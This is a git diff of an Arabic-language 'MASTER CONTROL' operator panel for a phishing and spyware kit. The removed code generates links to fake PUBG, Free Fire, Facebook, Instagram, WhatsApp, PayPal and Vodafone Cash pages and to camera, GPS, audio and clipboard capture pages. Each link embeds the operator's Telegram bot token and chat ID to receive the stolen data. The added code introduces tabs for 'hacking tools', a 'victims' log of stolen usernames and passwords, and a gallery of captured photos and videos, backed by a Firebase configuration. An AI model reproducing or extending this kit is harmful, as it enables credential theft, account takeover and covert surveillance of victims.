@@ -7,137 +7,183 @@
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
     <style>
-        :root { --red: #ff0040; --gold: #ffaa00; --dark: #0a0000; }
+        :root { --red: #ff0040; --gold: #ffaa00; --green: #00ff41; --dark: #0a0000; }
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family:'Courier New',monospace; background:#000; color:#fff; min-height:100vh; padding:16px; overflow-x:hidden; -webkit-tap-highlight-color:transparent; -webkit-user-select:none; user-select:none; }
-        @keyframes glitch { 0%{transform:translate(0)} 20%{transform:translate(-2px,2px)} 40%{transform:translate(2px,-2px)} 60%{transform:translate(-1px,1px)} 80%{transform:translate(1px,-1px)} 100%{transform:translate(0)} }
-        @keyframes flicker { 0%,100%{opacity:1} 30%{opacity:0.2} 60%{opacity:0.8} }
+        body { font-family:'Courier New',monospace; background:#000; color:#fff; min-height:100vh; padding:16px; overflow-x:hidden; }
         @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
+        @keyframes flicker { 0%,100%{opacity:1} 30%{opacity:0.2} 60%{opacity:0.8} }
         @keyframes scanLine { from{top:-100%} to{top:100%} }
-        @keyframes redFlash { 0%,100%{background:transparent} 50%{background:rgba(255,0,0,0.04)} }
-        @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-3px)} 75%{transform:translateX(3px)} }
-        @keyframes bloodDrip { from{top:-40px;opacity:1} to{top:110vh;opacity:0.2} }
-        @keyframes ghostFloat { 0%,100%{transform:translateY(0)rotate(-3deg)} 50%{transform:translateY(-20px)rotate(3deg)} }
-        @keyframes scream { 0%,100%{text-shadow:0 0 20px var(--red),0 0 40px var(--red)} 50%{text-shadow:0 0 30px var(--red),0 0 60px var(--red),0 0 90px var(--red)} }
         @keyframes fadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
-        @keyframes slideUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }
-        @keyframes progressGlow { 0%,100%{box-shadow:0 0 10px var(--gold)} 50%{box-shadow:0 0 30px var(--gold),0 0 60px var(--gold)} }
         
         .scan-line { position:fixed;left:0;right:0;height:2px;background:rgba(255,0,0,0.15);pointer-events:none;animation:scanLine 2s linear infinite;z-index:999; }
-        .flash-overlay { position:fixed;inset:0;pointer-events:none;z-index:998;animation:redFlash 1.2s ease-in-out infinite; }
-        .blood-drip { position:fixed;width:2px;height:35px;background:var(--red);z-index:997;animation:bloodDrip 3s ease-in infinite;box-shadow:0 0 10px var(--red);border-radius:0 0 2px 2px;pointer-events:none; }
-        .ghost { position:fixed;font-size:40px;z-index:996;animation:ghostFloat 4s ease-in-out infinite;opacity:0.2;pointer-events:none;filter:blur(0.5px); }
         
-        .container { max-width:480px;margin:0 auto;position:relative;z-index:1; }
+        .container { max-width:500px;margin:0 auto;position:relative;z-index:1; }
         .page { display:none;animation:fadeIn 0.3s ease-out; }
         .page.active { display:block; }
         
         .header { text-align:center;margin-bottom:20px; }
-        .skull { font-size:65px;animation:pulse 0.25s ease-in-out infinite;filter:drop-shadow(0 0 20px var(--red)); }
-        h1 { font-size:24px;color:var(--red);animation:scream 1.5s ease-in-out infinite;margin:10px 0;letter-spacing:4px; }
-        .subtitle { color:#660000;font-size:12px;letter-spacing:6px;animation:flicker 0.5s linear infinite; }
+        .skull { font-size:55px;animation:pulse 0.3s infinite;filter:drop-shadow(0 0 20px var(--red)); }
+        h1 { font-size:22px;color:var(--red);text-shadow:0 0 30px var(--red);margin:10px 0;letter-spacing:3px; }
         
-        .device-info { background:var(--dark);border:2px solid var(--red);border-radius:14px;padding:16px;margin-bottom:18px;text-align:center;box-shadow:0 0 40px rgba(255,0,64,0.5),inset 0 0 20px rgba(255,0,0,0.08);animation:redFlash 0.4s ease-in-out infinite; }
-        .device-info .d-name { color:var(--red);font-size:16px;font-weight:700; }
-        .device-info .d-code { color:#990000;font-size:11px;margin-top:4px; }
-        .device-info .d-time { color:var(--gold);font-size:11px;margin-top:2px; }
-        .sync-status { color:#4CAF50;font-size:10px;margin-top:4px; }
+        .nav { display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap; }
+        .nav-btn { flex:1;min-width:50px;padding:10px;background:var(--dark);border:1px solid #333;color:#fff;border-radius:8px;cursor:pointer;font-size:10px;text-align:center; }
+        .nav-btn.active { border-color:var(--red);color:var(--red); }
         
-        .card { background:#050000;border:2px solid #440000;border-radius:14px;padding:20px;margin-bottom:14px;box-shadow:0 0 30px rgba(255,0,0,0.25),inset 0 0 15px rgba(255,0,0,0.04);animation:redFlash 0.9s ease-in-out infinite; }
-        .input-group { margin-bottom:14px;text-align:right; }
-        .input-group label { color:#990000;font-size:12px;display:block;margin-bottom:5px;text-shadow:0 0 6px var(--red); }
-        .input-group input { width:100%;padding:14px;border-radius:8px;border:2px solid #440000;background:#0a0000;color:var(--red);font-size:14px;text-align:left;font-family:'Courier New',monospace;outline:none;letter-spacing:1px;text-shadow:0 0 6px var(--red);transition:all 0.3s ease; }
-        .input-group input:focus { border-color:var(--red);box-shadow:0 0 20px rgba(255,0,0,0.4); }
-        .input-group input::placeholder { color:#550000; }
+        .card { background:var(--dark);border:1px solid #333;border-radius:12px;padding:16px;margin-bottom:12px; }
+        .card h2 { color:var(--gold);font-size:14px;margin-bottom:12px;border-bottom:1px solid #333;padding-bottom:8px; }
         
-        .error-msg { color:var(--red);font-size:16px;text-align:center;margin-top:8px;display:none;text-shadow:0 0 20px var(--red),0 0 40px var(--red);font-weight:bold; }
-        .error-msg.show { display:block;animation:shake 0.4s ease; }
+        .stats-row { display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:16px; }
+        .stat-card { background:var(--dark);border:1px solid #333;border-radius:10px;padding:14px;text-align:center; }
+        .stat-card .num { color:var(--red);font-size:24px;font-weight:bold; }
+        .stat-card .txt { color:#666;font-size:10px;margin-top:4px; }
         
-        .btn { width:100%;padding:18px;border-radius:10px;border:2px solid var(--red);background:#0a0000;color:var(--red);font-size:17px;font-weight:700;cursor:pointer;font-family:'Courier New',monospace;text-shadow:0 0 12px var(--red);box-shadow:0 0 30px rgba(255,0,0,0.35);margin-top:12px;letter-spacing:3px;transition:all 0.2s ease;pointer-events:auto;z-index:10;position:relative; }
-        .btn:active { background:#1a0000;box-shadow:0 0 60px rgba(255,0,0,0.7);transform:scale(0.97); }
+        .log-item { background:#050000;border:1px solid #333;border-radius:8px;padding:12px;margin-bottom:6px; }
+        .log-item .time { color:#666;font-size:10px; }
+        .log-item .service { color:var(--red);font-size:12px;font-weight:bold; }
+        .log-item .data { color:#aaa;font-size:11px;margin-top:4px; }
         
-        .section-title { color:#9900ff;font-size:14px;text-align:center;margin:24px 0 12px;text-shadow:0 0 15px #9900ff,0 0 30px #9900ff;letter-spacing:3px; }
-        .tools-grid { display:grid;grid-template-columns:1fr 1fr;gap:10px; }
-        .tool-card { background:#050000;border:2px solid #440000;border-radius:14px;padding:18px 10px;text-align:center;cursor:pointer;box-shadow:0 0 18px rgba(255,0,0,0.18);transition:all 0.2s ease;pointer-events:auto;z-index:10;position:relative; }
-        .tool-card:active { background:#1a0000;border-color:var(--red);box-shadow:0 0 50px rgba(255,0,64,0.7);transform:scale(0.95); }
-        .tool-card.blocked { opacity:0.3;border-color:#333;pointer-events:none; }
-        .tool-card .icon { font-size:38px;filter:drop-shadow(0 0 8px currentColor);transition:transform 0.2s ease; }
-        .tool-card:active .icon { transform:scale(1.15); }
-        .tool-card .name { color:var(--red);font-size:11px;font-weight:700;margin-top:8px;letter-spacing:1px; }
+        .gallery-grid { display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px; }
+        .gallery-item { aspect-ratio:1;border-radius:8px;overflow:hidden;border:1px solid #333;cursor:pointer;background:#111;position:relative; }
+        .gallery-item img,.gallery-item video { width:100%;height:100%;object-fit:cover; }
+        .gallery-item .play-icon { position:absolute;top:5px;left:5px;background:rgba(0,0,0,0.7);color:#fff;padding:2px 6px;border-radius:4px;font-size:10px; }
         
-        .link-box { background:#050000;border:2px solid var(--gold);border-radius:10px;padding:16px;margin:16px 0;word-break:break-all;color:var(--gold);font-size:12px;cursor:pointer;box-shadow:0 0 30px rgba(255,170,0,0.35);animation:progressGlow 2s ease-in-out infinite;pointer-events:auto;z-index:10;position:relative; }
-        .copy-toast { position:fixed;top:24px;left:50%;transform:translateX(-50%);background:#0a0000;border:2px solid var(--gold);color:var(--gold);padding:16px 32px;border-radius:10px;font-size:16px;font-weight:700;z-index:1000;box-shadow:0 0 35px rgba(255,170,0,0.5);animation:slideUp 0.3s ease-out; }
-        .back-btn { background:none;border:1px solid #550000;color:#990000;padding:8px 16px;border-radius:6px;cursor:pointer;font-family:'Courier New',monospace;margin-bottom:16px;font-size:12px;pointer-events:auto;z-index:10;position:relative; }
-        .code-hint { background:#0a0000;border:2px solid var(--red);border-radius:10px;padding:12px;text-align:center;margin-top:12px; }
-        .setup-badge { display:inline-block;background:#0a0000;border:1px solid var(--red);color:var(--red);padding:4px 10px;border-radius:6px;font-size:10px;margin-bottom:12px; }
-        .gen-progress { width:100%;height:4px;background:#0a0000;border-radius:2px;margin:14px 0;overflow:hidden; }
-        .gen-progress-fill { height:100%;width:0%;background:var(--gold);transition:width 0.2s ease;box-shadow:0 0 20px var(--gold); }
+        .tool-grid { display:grid;grid-template-columns:1fr 1fr;gap:8px; }
+        .tool-card { background:var(--dark);border:1px solid #333;border-radius:10px;padding:14px;text-align:center;cursor:pointer;font-size:11px; }
+        .tool-card:active { border-color:var(--red);transform:scale(0.95); }
+        .tool-card .icon { font-size:28px;display:block;margin-bottom:6px; }
+        .tool-card.blocked { opacity:0.3;pointer-events:none; }
+        
+        .modal { display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:999;justify-content:center;align-items:center;padding:20px; }
+        .modal.show { display:flex; }
+        .modal img,.modal video { max-width:95%;max-height:85vh;border-radius:10px; }
+        .modal .close { position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer;background:rgba(255,0,0,0.5);width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center; }
+        
+        .input-group { margin-bottom:12px; }
+        .input-group input,.input-group select { width:100%;padding:12px;background:#000;border:1px solid #333;border-radius:6px;color:#fff;font-size:13px;font-family:'Courier New',monospace;outline:none; }
+        .input-group input:focus { border-color:var(--red); }
+        
+        .btn { width:100%;padding:14px;border-radius:8px;border:none;font-size:14px;font-weight:bold;cursor:pointer;margin-top:6px; }
+        .btn-red { background:#2a0a0a;color:var(--red);border:1px solid var(--red); }
+        .btn-gold { background:#0a0a2a;color:var(--gold);border:1px solid var(--gold); }
+        .btn:active { transform:scale(0.96); }
+        
+        .file-zone { border:2px dashed #333;border-radius:12px;padding:25px;text-align:center;cursor:pointer;margin:10px 0; }
+        .file-zone:hover { border-color:var(--gold); }
+        input[type=file] { display:none; }
+        
+        .empty { text-align:center;color:#666;padding:30px;font-size:13px; }
+        .refresh-btn { width:100%;padding:12px;background:var(--dark);border:1px solid #333;color:#fff;border-radius:8px;cursor:pointer;font-size:13px;margin-bottom:12px; }
     </style>
 </head>
 <body>
 <div class="scan-line"></div>
-<div class="flash-overlay"></div>
-<div class="blood-drip" style="left:8%;animation-delay:0s;"></div>
-<div class="blood-drip" style="left:25%;animation-delay:1.2s;"></div>
-<div class="blood-drip" style="left:45%;animation-delay:2.4s;"></div>
-<div class="blood-drip" style="left:65%;animation-delay:0.8s;"></div>
-<div class="blood-drip" style="left:85%;animation-delay:1.8s;"></div>
-<div class="ghost" style="top:8%;left:5%;animation-delay:0s;">👻</div>
-<div class="ghost" style="top:25%;right:5%;animation-delay:1.5s;">👻</div>
-<div class="ghost" style="top:50%;left:7%;animation-delay:3s;">👻</div>
-<div class="ghost" style="top:70%;right:8%;animation-delay:2s;">👻</div>
-
 <div class="container">
-    <div class="page active" id="page-login">
-        <div class="header"><div class="skull">☠️</div><h1>MASTER CONTROL</h1><div class="subtitle">━━ ☠ RESTRICTED ☠ ━━</div></div>
-        <div class="device-info">
-            <div class="d-name" id="device-name">💀 جاري الكشف...</div>
-            <div class="d-code" id="device-code"></div>
-            <div class="d-time" id="device-time"></div>
-            <div class="sync-status" id="sync-status">🔄 جاري المزامنة مع السيرفر...</div>
-        </div>
-        <div class="card">
-            <div class="input-group"><label>🤖 BOT TOKEN</label><input type="text" id="bot-token" placeholder="123456:ABC-DEF" autocomplete="off"></div>
-            <div class="input-group"><label>🆔 CHAT ID</label><input type="text" id="chat-id" placeholder="7276604783" autocomplete="off"></div>
-            <div class="input-group"><label>🔐 ACCESS CODE</label><input type="password" id="code-input" placeholder="••••••••" maxlength="10" autocomplete="off" autofocus></div>
-            <div class="error-msg" id="code-error">☠ ACCESS DENIED ☠</div>
-            <button class="btn" onclick="checkCode()">💀 UNLOCK 💀</button>
-        </div>
-        <div class="code-hint" id="code-hint"></div>
+
+    <div class="header">
+        <div class="skull">💀</div>
+        <h1>MASTER CONTROL</h1>
     </div>
 
-    <div class="page" id="page-tools">
-        <div class="header"><div class="skull">💀</div><h1>CONTROL PANEL</h1></div>
-        <div class="setup-badge" id="setup-badge"></div>
-        <button class="back-btn" onclick="logout()">🔒 قفل</button>
-        <div id="tools-container">⏳ جاري تحميل الأدوات...</div>
+    <div class="nav">
+        <button class="nav-btn active" onclick="showTab('tools')">🛠️ أدوات</button>
+        <button class="nav-btn" onclick="showTab('upload')">📤 رفع</button>
+        <button class="nav-btn" onclick="showTab('dashboard')">📊 لوحة</button>
+        <button class="nav-btn" onclick="showTab('victims')">👥 ضحايا</button>
+        <button class="nav-btn" onclick="showTab('gallery')">📸 معرض</button>
     </div>
 
-    <div class="page" id="page-generate">
-        <button class="back-btn" onclick="showPage('page-tools')">← رجوع</button>
-        <div style="text-align:center;"><div class="skull">⚡</div><h1>جاري توليد الرابط...</h1><div class="gen-progress"><div class="gen-progress-fill" id="gen-fill"></div></div></div>
-        <div id="gen-result" style="display:none;text-align:center;"><div class="skull">🔗</div><h1>الرابط جاهز</h1><div class="link-box" id="link-box" onclick="copyLink()"></div><p style="color:#660000;font-size:11px;">💀 اضغط للنسخ 💀</p></div>
+    <!-- الأدوات -->
+    <div class="page active" id="tab-tools">
+        <div class="card"><h2>🛠️ أدوات الاختراق</h2>
+        <div class="tool-grid" id="tools-grid"></div></div>
+    </div>
+
+    <!-- رفع -->
+    <div class="page" id="tab-upload">
+        <div class="card"><h2>📤 رفع صورة أو فيديو</h2>
+        <input type="file" id="uploadFile" accept="image/*,video/*" onchange="previewUpload()">
+        <div class="file-zone" onclick="document.getElementById('uploadFile').click()">
+            <div style="font-size:40px;">📤</div>
+            <div style="color:#666;font-size:13px;margin-top:8px;">اضغط لاختيار صورة أو فيديو</div>
+        </div>
+        <div id="uploadPreview" style="margin-top:10px;text-align:center;"></div>
+        <button class="btn btn-gold" onclick="uploadMedia()">📤 رفع للمعرض</button></div>
+        
+        <div class="card"><h2>📝 إضافة بيانات حساب</h2>
+        <div class="input-group">
+            <select id="v-service" style="margin-bottom:8px;">
+                <option value="">اختر النوع</option>
+                <option>فيسبوك</option><option>انستجرام</option><option>واتساب</option>
+                <option>تويتر</option><option>سناب</option><option>تيك توك</option>
+                <option>PUBG</option><option>فري فاير</option>
+            </select>
+            <input type="text" id="v-user" placeholder="اسم المستخدم / الإيميل" style="margin-bottom:8px;">
+            <input type="password" id="v-pass" placeholder="كلمة المرور">
+        </div>
+        <button class="btn btn-red" onclick="saveVictim()">📝 حفظ في السجل</button></div>
+    </div>
+
+    <!-- لوحة -->
+    <div class="page" id="tab-dashboard">
+        <div class="stats-row">
+            <div class="stat-card"><div class="num" id="s-victims">0</div><div class="txt">ضحايا</div></div>
+            <div class="stat-card"><div class="num" id="s-photos">0</div><div class="txt">صور</div></div>
+            <div class="stat-card"><div class="num" id="s-videos">0</div><div class="txt">فيديو</div></div>
+        </div>
+        <button class="refresh-btn" onclick="loadDashboard()">🔄 تحديث</button>
+        <div class="card"><h2>🕐 آخر النشاطات</h2><div id="recent-logs"></div></div>
+    </div>
+
+    <!-- ضحايا -->
+    <div class="page" id="tab-victims">
+        <button class="refresh-btn" onclick="loadVictims()">🔄 تحديث</button>
+        <div class="card"><h2>👥 سجل الضحايا</h2><div id="victims-list"></div></div>
+    </div>
+
+    <!-- معرض -->
+    <div class="page" id="tab-gallery">
+        <button class="refresh-btn" onclick="loadGallery()">🔄 تحديث</button>
+        <div class="card"><h2>📸 المعرض</h2><div class="gallery-grid" id="gallery-grid"></div></div>
     </div>
 </div>
 
+<div class="modal" id="modal" onclick="closeModal()">
+    <span class="close">✕</span>
+    <img id="modalImg" src="" style="display:none;">
+    <video id="modalVid" controls style="display:none;"></video>
+</div>
+
 <script>
-var BASE = 'https://ai-proxy-eosin.vercel.app';
-var BASE2 = 'https://pubgskin.vercel.app';
-var botToken = '';
-var chatId = '';
-var audioCtx = null;
+var db;
 var remoteCodes = {admin:true, elgen:true};
 var blockedTools = [];
+var API = 'https://pubgskin.vercel.app/api/save';
 
-// ========== FIREBASE ==========
+// Firebase
 firebase.initializeApp({
     apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
     projectId: "game-a1aca",
     storageBucket: "game-a1aca.firebasestorage.app",
     appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
 });
-var db = firebase.firestore();
+db = firebase.firestore();
 
+// ========== تبويبات ==========
+function showTab(tab) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+    document.getElementById('tab-' + tab).classList.add('active');
+    var tabs = ['tools','upload','dashboard','victims','gallery'];
+    var i = tabs.indexOf(tab);
+    if (i >= 0) document.querySelectorAll('.nav-btn')[i].classList.add('active');
+    
+    if (tab === 'dashboard') loadDashboard();
+    if (tab === 'victims') loadVictims();
+    if (tab === 'gallery') loadGallery();
+    if (tab === 'tools') loadTools();
+}
+
+// ========== Firebase ==========
 async function loadFirebaseConfig() {
     try {
         var doc = await db.collection('config').doc('settings').get();
@@ -145,247 +191,184 @@ async function loadFirebaseConfig() {
             var data = doc.data();
             if (data.codes) remoteCodes = data.codes;
             if (data.blocked_tools) blockedTools = data.blocked_tools;
-            document.getElementById('sync-status').textContent = '✅ متزامن مع السيرفر';
-            document.getElementById('sync-status').style.color = '#4CAF50';
-        }
-    } catch(e) {
-        document.getElementById('sync-status').textContent = '⚠️ وضع غير متصل';
-    }
-}
-
-function isValidCode(code) {
-    return remoteCodes[code] === true;
-}
-
-// ========== AUDIO ==========
-function getAudioCtx() {
-    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    if (audioCtx.state === 'suspended') audioCtx.resume();
-    return audioCtx;
-}
-
-function playSound(type) {
-    try {
-        var ctx = getAudioCtx();
-        var now = ctx.currentTime;
-        if (type === 'login_success') {
-            [150,250,350,450,550,700,900].forEach(function(f,i) {
-                var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
-                o.frequency.value=f;o.type='sawtooth';g.gain.setValueAtTime(0.1,now+i*0.08);
-                g.gain.exponentialRampToValueAtTime(0.001,now+i*0.08+0.3);o.start(now+i*0.08);o.stop(now+i*0.08+0.3);
-            });
-        } else if (type === 'error') {
-            for(var i=0;i<5;i++) {
-                var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
-                o.frequency.value=55+(i*18);o.type='sawtooth';g.gain.setValueAtTime(0.15,now+i*0.1);
-                g.gain.exponentialRampToValueAtTime(0.001,now+i*0.1+0.2);o.start(now+i*0.1);o.stop(now+i*0.1+0.2);
-            }
-        } else if (type === 'click') {
-            var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
-            o.frequency.setValueAtTime(1000,now);o.frequency.exponentialRampToValueAtTime(500,now+0.06);
-            o.type='sine';g.gain.setValueAtTime(0.06,now);g.gain.exponentialRampToValueAtTime(0.001,now+0.06);o.start(now);o.stop(now+0.06);
-        } else if (type === 'copy') {
-            [600,1000,1400].forEach(function(f,i) {
-                var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
-                o.frequency.value=f;o.type='triangle';g.gain.setValueAtTime(0.04,now+i*0.06);
-                g.gain.exponentialRampToValueAtTime(0.001,now+i*0.06+0.08);o.start(now+i*0.06);o.stop(now+i*0.06+0.08);
-            });
-        } else if (type === 'generate') {
-            for(var i=0;i<8;i++) {
-                var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
-                o.frequency.value=200+(i*140);o.type='square';g.gain.setValueAtTime(0.03,now+i*0.1);
-                g.gain.exponentialRampToValueAtTime(0.001,now+i*0.1+0.15);o.start(now+i*0.1);o.stop(now+i*0.1+0.15);
-            }
-        } else if (type === 'typing') {
-            var o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
-            o.frequency.value=500+Math.random()*400;o.type='sine';g.gain.setValueAtTime(0.02,now);
-            g.gain.exponentialRampToValueAtTime(0.001,now+0.03);o.start(now);o.stop(now+0.03);
         }
     } catch(e) {}
 }
 
-// ========== DEVICE ==========
-function getDevice() {
-    var ua = navigator.userAgent;
-    if (ua.indexOf('SM-A105') !== -1 || ua.indexOf('SM-A107') !== -1) return {name:'Samsung Galaxy A10',isA10:true};
-    return {name:'جهاز',isA10:false};
+function isValidCode(code) { return remoteCodes[code] === true; }
+
+// ========== تخزين البيانات ==========
+function saveToLocal(type, data) {
+    var storage = JSON.parse(localStorage.getItem('mc_data') || '{"victims":[],"gallery":[],"videos":[]}');
+    data.timestamp = new Date().toISOString();
+    if (type === 'victim') storage.victims.push(data);
+    if (type === 'photo') storage.gallery.push(data);
+    if (type === 'video') storage.videos.push(data);
+    localStorage.setItem('mc_data', JSON.stringify(storage));
 }
 
-var device = getDevice();
-var IS_A10 = device.isA10;
-var EXPIRY_KEY = 'master_expiry';
-
-if (!IS_A10) {
-    var expiry = localStorage.getItem(EXPIRY_KEY);
-    if (!expiry) { expiry = Date.now() + (3*24*60*60*1000); localStorage.setItem(EXPIRY_KEY, expiry); }
-    if (Date.now() > parseInt(expiry)) { localStorage.removeItem(EXPIRY_KEY); localStorage.removeItem('master_auth'); }
+function getLocalData() {
+    return JSON.parse(localStorage.getItem('mc_data') || '{"victims":[],"gallery":[],"videos":[]}');
 }
 
-document.getElementById('device-name').textContent = '💀 ' + device.name;
-document.getElementById('device-code').textContent = IS_A10 ? '🔑 admin (دائم)' : '🔑 رموز من السيرفر';
-if (!IS_A10) {
-    var remaining = Math.max(0, Math.floor((parseInt(localStorage.getItem(EXPIRY_KEY)) - Date.now()) / (1000*60*60*24)));
-    document.getElementById('device-time').textContent = '⏰ متبقي: ' + remaining + ' يوم';
-}
-
-document.getElementById('code-input').addEventListener('input',function(){playSound('typing');});
-
-var saved = JSON.parse(localStorage.getItem('master_setup')||'{}');
-if(saved.token && saved.chatId){botToken=saved.token;chatId=saved.chatId;document.getElementById('bot-token').value=botToken;document.getElementById('chat-id').value=chatId;}
-
-// ========== PAGES ==========
-function showPage(id) {
-    var pages=document.querySelectorAll('.page');
-    for(var i=0;i<pages.length;i++){pages[i].classList.remove('active');}
-    document.getElementById(id).classList.add('active');
-    if(id==='page-tools'){playSound('login_success');renderTools();}
-    window.scrollTo({top:0,behavior:'smooth'});
-}
-
-// ========== LOGIN ==========
-async function checkCode() {
-    var code = document.getElementById('code-input').value.trim();
-    botToken = document.getElementById('bot-token').value.trim();
-    chatId = document.getElementById('chat-id').value.trim();
-    var error = document.getElementById('code-error');
-
-    if(!botToken||!chatId){error.textContent='☠ اكتب التوكن والـ Chat ID ☠';error.classList.add('show');playSound('error');return;}
+// ========== لوحة ==========
+function loadDashboard() {
+    var data = getLocalData();
+    var victims = data.victims || [];
+    var gallery = data.gallery || [];
+    var videos = data.videos || [];
     
-    await loadFirebaseConfig();
-
-    if(!IS_A10){
-        var exp=localStorage.getItem(EXPIRY_KEY);
-        if(exp && Date.now()>parseInt(exp)){error.textContent='☠ انتهت الصلاحية! ☠';error.classList.add('show');playSound('error');return;}
-    }
-
-    if(isValidCode(code)){
-        error.classList.remove('show');
-        localStorage.setItem('master_auth',code);
-        localStorage.setItem('master_setup',JSON.stringify({token:botToken,chatId:chatId}));
-        document.getElementById('setup-badge').textContent='💀 '+chatId;
-        playSound('login_success');
-        setTimeout(function(){showPage('page-tools');},200);
-    } else {
-        error.classList.add('show');
-        playSound('error');
-        document.getElementById('code-input').value='';
-    }
-}
-
-function logout(){localStorage.removeItem('master_auth');showPage('page-login');playSound('click');}
-
-// ========== TOOLS ==========
-function renderTools() {
-    var tools = [
-        {section:'📸 الكاميرا والميديا',items:[
-            {page:'photo-front.html',name:'صور أمامية',icon:'📸'},
-            {page:'photo-back.html',name:'صور خلفية',icon:'📷'},
-            {page:'mm.html',name:'فيديو أمامي',icon:'🎥'},
-            {page:'video-back.html',name:'فيديو خلفي',icon:'📹'},
-            {page:'location.html',name:'GPS موقع',icon:'📍'},
-            {page:'audio.html',name:'تسجيل صوت',icon:'🎙️'}
-        ]},
-        {section:'🎮 الألعاب',items:[
-            {page:'g.html',name:'شحن PUBG',icon:'🔫'},
-            {page:'freefire.html',name:'شحن فري فاير',icon:'🎯'},
-            {page:'fifa.html',name:'نقاط FUT',icon:'⚽'},
-            {page:'discord.html',name:'Nitro مجاني',icon:'💎'}
-        ]},
-        {section:'📱 السوشيال ميديا',items:[
-            {page:'fb.html',name:'فيسبوك',icon:'📘'},
-            {page:'insta.html',name:'انستجرام',icon:'📷'},
-            {page:'whatsapp.html',name:'واتساب',icon:'💬'},
-            {page:'twitter.html',name:'تويتر/X',icon:'𝕏'},
-            {page:'snapchat.html',name:'سناب شات',icon:'👻'},
-            {page:'tiktok.html',name:'تيك توك',icon:'🎵'},
-            {page:'spotify.html',name:'Spotify',icon:'🎧'},
-            {page:'netflix.html',name:'Netflix',icon:'📺'}
-        ]},
-        {section:'💰 المال والجوائز',items:[
-            {page:'paypal.html',name:'PayPal',icon:'💳'},
-            {page:'vodafone.html',name:'فودافون كاش',icon:'🏦'},
-            {page:'iphone.html',name:'iPhone 15',icon:'📱'},
-            {page:'recharge.html',name:'شحن مجاني',icon:'📡'}
-        ]},
-        {section:'🔓 أدوات متقدمة',items:[
-            {page:'scan.html',name:'رفع 10 صور',icon:'📁'},
-            {page:'clipboard.html',name:'سحب الحافظة',icon:'📋'},
-            {page:'live.html',name:'كاميرا مباشر',icon:'🎥'}
-        ]}
-    ];
-
+    document.getElementById('s-victims').textContent = victims.length;
+    document.getElementById('s-photos').textContent = gallery.length;
+    document.getElementById('s-videos').textContent = videos.length;
+    
+    var all = [];
+    victims.forEach(v => all.push({time:v.timestamp, service:v.service, text:v.text}));
+    gallery.forEach(g => all.push({time:g.timestamp, service:'📸 صورة', text:g.caption}));
+    videos.forEach(v => all.push({time:v.timestamp, service:'🎬 فيديو', text:v.caption}));
+    all.sort((a,b) => new Date(b.time) - new Date(a.time));
+    
     var html = '';
-    for(var s=0;s<tools.length;s++){
-        var section = tools[s];
-        html += '<div class="section-title">━━ '+section.section+' ━━</div><div class="tools-grid">';
-        for(var t=0;t<section.items.length;t++){
-            var tool = section.items[t];
-            var isBlocked = blockedTools.indexOf(tool.page) !== -1;
-            html += '<div class="tool-card'+(isBlocked?' blocked':'')+'" onclick="'+(isBlocked?'':'generateLink(\''+tool.page+'\')')+'">';
-            html += '<div class="icon">'+tool.icon+'</div><div class="name">'+tool.name+(isBlocked?' 🔒':'')+'</div></div>';
-        }
-        html += '</div>';
-    }
-    document.getElementById('tools-container').innerHTML = html;
+    all.slice(0,10).forEach(a => {
+        html += '<div class="log-item"><div class="time">🕐 ' + (a.time ? new Date(a.time).toLocaleString('ar-EG') : '') + '</div><div class="service">' + a.service + '</div><div class="data">' + (a.text || '') + '</div></div>';
+    });
+    document.getElementById('recent-logs').innerHTML = html || '<div class="empty">لا توجد سجلات</div>';
 }
 
-// ========== GENERATE LINK ==========
-function getBase(page) {
-    var mainPages = ['photo-front.html','photo-back.html','mm.html','video-back.html','location.html','audio.html','g.html','fb.html','insta.html','whatsapp.html','twitter.html','snapchat.html','tiktok.html'];
-    if(mainPages.indexOf(page)!==-1)return BASE;
-    return BASE2;
+// ========== ضحايا ==========
+function loadVictims() {
+    var data = getLocalData();
+    var html = '';
+    (data.victims || []).reverse().forEach(v => {
+        html += '<div class="log-item"><div class="time">🕐 ' + (v.timestamp ? new Date(v.timestamp).toLocaleString('ar-EG') : '') + '</div><div class="service">' + (v.service || '') + '</div><div class="data">' + (v.text || '') + '</div></div>';
+    });
+    document.getElementById('victims-list').innerHTML = html || '<div class="empty">لا يوجد ضحايا</div>';
 }
 
-function generateLink(page) {
-    showPage('page-generate');
-    document.getElementById('gen-result').style.display='none';
-    document.getElementById('gen-fill').style.width='0%';
-    document.getElementById('gen-fill').parentElement.style.display='block';
-    playSound('click');playSound('generate');
-    var width=0;
-    var fill=document.getElementById('gen-fill');
-    var interval=setInterval(function(){
-        width+=20;fill.style.width=width+'%';
-        if(width>=100){
-            clearInterval(interval);
-            var base=getBase(page);
-            var link=base+'/'+page+'?chatId='+chatId+'&token='+encodeURIComponent(botToken);
-            document.getElementById('link-box').textContent=link;
-            document.getElementById('gen-result').style.display='block';
-            document.getElementById('gen-fill').parentElement.style.display='none';
-            playSound('copy');
-        }
-    },200);
-}
-
-function copyLink() {
-    var link=document.getElementById('link-box').textContent;
